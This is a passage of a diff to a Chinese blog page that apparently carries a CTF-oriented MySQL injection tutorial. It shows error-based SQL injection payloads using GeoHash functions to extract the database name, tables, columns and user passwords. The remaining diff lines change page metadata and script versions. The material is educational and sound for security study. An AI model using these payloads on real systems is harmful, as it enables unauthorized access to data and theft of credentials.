+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 数据库的名字<br><span class="hljs-keyword">select</span> ST_LongFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())));<br># 爆出表的名字<br><span class="hljs-keyword">select</span> ST_LongFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())));<br># 爆出列名<br><span class="hljs-keyword">select</span> ST_LongFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema<span class="hljs-operator">=</span>database())));<br># 查询字段<br><span class="hljs-keyword">select</span> ST_LongFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> demo01.users)));<br></code></pre></td></tr></table></figure>
+
+<h4 id="ST-LatFromGeoHash"><a href="#ST-LatFromGeoHash" class="headerlink" title="ST_LatFromGeoHash()"></a>ST_LatFromGeoHash()</h4><p>这个也是同理</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span> ST_LatFromGeoHash(CONCAT(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">USER</span>()),<span class="hljs-number">0x7e</span>));<br>ERROR <span class="hljs-number">1411</span> (HY000): Incorrect geohash <span class="hljs-keyword">value</span>: <span class="hljs-string">&#x27;~root@localhost~&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> ST_LATFROMGEOHASH<br></code></pre></td></tr></table></figure>
+
+<p>同理</p>
+<h4 id="ST-PointFromGeoHash"><a href="#ST-PointFromGeoHash" class="headerlink" title="ST_PointFromGeoHash()"></a>ST_PointFromGeoHash()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> ST_PointFromGeoHash(<span class="hljs-keyword">USER</span>(),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>注意注意这个就不一样了，这个是有两个参数的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ST_PointFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> demo01.users)),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<p>到这里就结束了</p>
+<p>接下来解释GTID函数的报错注入</p>
+<h3 id="GTID函数类-mysql-5-6-x-显错"><a href="#GTID函数类-mysql-5-6-x-显错" class="headerlink" title="GTID函数类(mysql&gt;&#x3D;5.6.x-显错&lt;&#x3D;200)"></a>GTID函数类(mysql&gt;&#x3D;5.6.x-显错&lt;&#x3D;200)</h3><p>GTID（全局事务标识符）</p>
+
                 
               </div>
             
@@ -535,6 +822,43 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" class="category-chain-item">靶场搭建</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/ctf%E6%AF%94%E8%B5%9B%EF%BC%8C%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/" class="print-no-link">#ctf比赛，比赛平台</a>
+      
+    </div>
   
 </div>
 
@@ -544,20 +868,20 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>https://exploreio.github.io/2026/05/07/sql_injec/</div>
+      <div>mysql注入教程</div>
+      <div>https://exploreio.github.io/2026/05/05/sql_injec/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>John Doe</div>
+          <div>ExploreIO</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年5月7日</div>
+          <div>2026年5月5日</div>
         </div>
       
       
@@ -589,12 +913,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2026/05/05/gzctf/" title="gzctf平台搭建教程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">gzctf平台搭建教程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/05/05/gzctf/" title="gzctf平台搭建教程">
-                        <span class="hidden-mobile">gzctf平台搭建教程</span>
+                      <a href="/2026/04/13/file_include/" title="文件包含漏洞手法总结">
+                        <span class="hidden-mobile">文件包含漏洞手法总结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -928,23 +1258,23 @@
   </noscript>
 <!-- hexo injector body_end start -->
 <!-- 全屏背景 -->
-<script src="/js/background.js?v=1778163980142"></script>
+<script src="/js/background.js?v=1778288192617"></script>
 
 <!-- 落雪动画 -->
-<script src="/js/snow.js?v=1778163980142"></script>
+<script src="/js/snow.js?v=1778288192617"></script>
 
 <!-- 签名动画 -->
-<script src="/js/sign.js?v=1778163980142"></script>
-<link rel="stylesheet" href="/css/sign.css?v=1778163980142">
+<script src="/js/sign.js?v=1778288192617"></script>
+<link rel="stylesheet" href="/css/sign.css?v=1778288192617">
 
 <!-- 标签页标题变化 -->
-<script src="/js/title.js?v=1778163980142"></script>
+<script src="/js/title.js?v=1778288192617"></script>
 
 <!-- 文章卡片滑入动画 -->
-<script src="/js/scrollAnimation.js?v=1778163980142"></script>
-<link rel="stylesheet" href="/css/scrollAnimation.css?v=1778163980142">
+<script src="/js/scrollAnimation.js?v=1778288192617"></script>
+<link rel="stylesheet" href="/css/scrollAnimation.css?v=1778288192617">
 
 <!-- 网站运行时间 -->
-<script src="/js/time-insert.js?v=1778163980142"></script>
+<script src="/js/time-insert.js?v=1778288192617"></script>
   <!-- hexo injector body_end end --></body>
 </html>
